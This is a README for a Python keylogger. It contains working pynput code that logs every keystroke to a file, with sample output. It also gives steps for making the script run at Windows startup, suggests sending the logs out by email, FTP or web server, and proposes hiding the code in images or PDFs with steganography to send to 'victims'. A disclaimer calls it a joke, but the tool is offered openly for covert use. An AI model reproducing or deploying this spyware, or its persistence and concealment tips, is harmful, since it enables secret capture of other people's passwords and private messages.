## python3_Keylogger ♘
python3 keylogger 

1) install python 3 then install pynput with following command
	```python
	   python -m pip install pynput
	```
2) output was automatically saved on script directory that was running <br>
3) Use Shell as follow<br>
  3-1) win+R<br>
  3-2) paste shell:startup then enter<br>
  3-3) copy keylogger.py in folder that apeared before<br>
  3-4) change dir to different location<br>

### you can use SMTP Email or FTP Client or Web Server to get KeyStroke
#### ☕☕ Good Luck! (mrt.mycloud@gmail.com)

```python
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```
output as follow
```C#
2021-04-10 16:46:43,841: Key.backspace
2021-04-10 16:46:44,298: 'p'
2021-04-10 16:46:44,578: 'y'
2021-04-10 16:46:44,826: 't'
2021-04-10 16:46:44,922: 'h'
2021-04-10 16:46:45,154: 'o'
2021-04-10 16:46:45,354: 'n'
2021-04-10 16:46:45,898: <99>
2021-04-10 16:46:47,178: <193>
2021-04-10 16:46:48,114: Key.shift_r
2021-04-10 16:46:48,474: '+'
2021-04-10 16:46:49,298: Key.backspace
2021-04-10 16:46:50,346: Key.shift_r
```
#### this keylogger can be used on windows/linux/Mac
#### ʕ•́ᴥ•̀ʔ you can Hide this code on .jpg/.png/.pdf with "steganography" then send to the victims
#### 🎲This file is just an internet joke and nothing else🎲
<div><a href="https://wallet.nimiq.com/nimiq:NQ22NDADB32E37NV4BN56APH0VAFR3JVGJ49" target="_blank"><img src="https://www.nimiq.com/accept-donations/img/donationBtnImg/blue-big.svg" width="150"/></a></div>
